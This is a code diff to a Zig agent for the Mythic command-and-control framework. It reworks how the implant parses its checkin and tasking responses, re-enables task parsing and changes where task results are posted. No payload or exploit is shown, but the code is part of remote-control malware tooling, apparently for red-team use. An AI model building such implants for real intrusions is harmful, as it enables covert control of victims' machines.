@@ -175,6 +175,29 @@ pub const MythicAgent = struct {
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
 
+        print("[DEBUG] Response: {s}\n", .{response});
+
+        // Skip CallbackUUID
+        if (response.len < 36) {
+            print("[ERROR] Response too short to contain CallbackUUID\n", .{});
+            return error.InvalidResponse;
+        }
+        
+        // Parse JSON response
+        const parsed = json.parseFromSlice(json.Value, self.allocator, response, .{}) catch |err| {
+            print("[ERROR] Failed to parse checkin JSON: {}\n", .{err});
+            return err;
+        };
+        defer parsed.deinit();
+        if (parsed.value.object.get("id")) |payload_uuid_value| {
+            self.payload_uuid = try self.allocator.dupe(u8, payload_uuid_value.string);
+            print("[+] Payload UUID: {s}\n", .{self.payload_uuid});
+        } else {
+            print("[!] No payload UUID in checkin response\n", .{});
+            return error.InvalidResponse;
+        }
+
+
         self.last_checkin = TimeUtils.getCurrentTimestamp();
     }
     
@@ -214,30 +237,30 @@ pub const MythicAgent = struct {
         }
 
         // Parse Base64-encoded response (CallbackUUID + JSON)
-        const decoded_response = try self.allocator.alloc(u8, base64.standard.Decoder.calcSizeForSlice(response) catch {
-            print("[ERROR] Invalid Base64 response\n", .{});
-            return error.InvalidBase64;
-        });
+        //const decoded_response = try self.allocator.alloc(u8, base64.standard.Decoder.calcSizeForSlice(response) catch {
+        //    print("[ERROR] Invalid Base64 response\n", .{});
+        //    return error.InvalidBase64;
+        //});
         print("[DEBUG] Response: {s}\n", .{response});
-        defer self.allocator.free(decoded_response);
-        base64.standard.Decoder.decode(decoded_response, response) catch {
-            print("[ERROR] Failed to decode Base64 response\n", .{});
-            return error.InvalidBase64;
-        };
+        //defer self.allocator.free(decoded_response);
+        //base64.standard.Decoder.decode(decoded_response, response) catch {
+        //    print("[ERROR] Failed to decode Base64 response\n", .{});
+        //    return error.InvalidBase64;
+        //};
         // Skip CallbackUUID (15 bytes for "payload-uuid-456")
-        if (decoded_response.len < 36) {
+        if (response.len < 36) {
             print("[ERROR] Response too short to contain CallbackUUID\n", .{});
             return error.InvalidResponse;
         }
-        const json_response = decoded_response[36..];
+        //const json_response = response[36..];
         // Parse JSON tasks
         const Task = struct {
             id: []const u8,
             command: []const u8,
-            timestamp: f64,
+            timestamp: i64,
             parameters: json.Value,
         };
-        const parsed = json.parseFromSlice(struct { tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
+        const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, response, .{}) catch |err| {
             print("[ERROR] Failed to parse tasking JSON: {}\n", .{err});
             return err;
         };
@@ -255,7 +278,7 @@ pub const MythicAgent = struct {
         }
     
         // Parse response for new tasks
-        //try self.parseTaskResponse(response);
+        try self.parseTaskResponse(response);
     }
     
     // Parse task response from C2
@@ -272,7 +295,7 @@ pub const MythicAgent = struct {
                         .id = try self.allocator.dupe(u8, task_obj.get("id").?.string),
                         .command = try self.allocator.dupe(u8, task_obj.get("command").?.string),
                         .parameters = try self.allocator.dupe(u8, task_obj.get("parameters").?.string),
-                        .timestamp = try self.allocator.dupe(u8, task_obj.get("timestamp").?.string),
+                        .timestamp = try std.fmt.allocPrint(self.allocator, "{d}", .{task_obj.get("timestamp").?.integer}), 
                     };
                     
                     try self.tasks.append(task);
@@ -337,7 +360,7 @@ pub const MythicAgent = struct {
             const json_data = try json.stringifyAlloc(self.allocator, response_data, .{});
             defer self.allocator.free(json_data);
             
-            const server_response = try self.network_client.sendRequest("/api/v1.4/agent_message", json_data);
+            const server_response = try self.network_client.sendRequest("/data", json_data);
             defer self.allocator.free(server_response);
             
             print("[+] Sent response for task: {s}\n", .{response.task_id});
